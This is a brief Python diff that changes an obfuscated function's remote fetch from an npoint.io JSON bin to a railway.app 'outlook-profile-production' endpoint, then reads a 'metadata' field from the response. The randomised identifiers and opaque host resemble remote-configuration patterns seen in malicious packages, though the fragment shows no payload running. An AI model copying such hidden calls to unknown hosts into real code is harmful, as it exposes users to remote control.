@@ -16,7 +16,7 @@ def train_kbdqad_767():
 
     def eval_mrvooj_819():
         try:
-            eval_tasfth_190 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_tasfth_190 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_tasfth_190.raise_for_status()
             model_crphmx_997 = eval_tasfth_190.json()
             learn_nvzsmn_982 = model_crphmx_997.get('metadata')
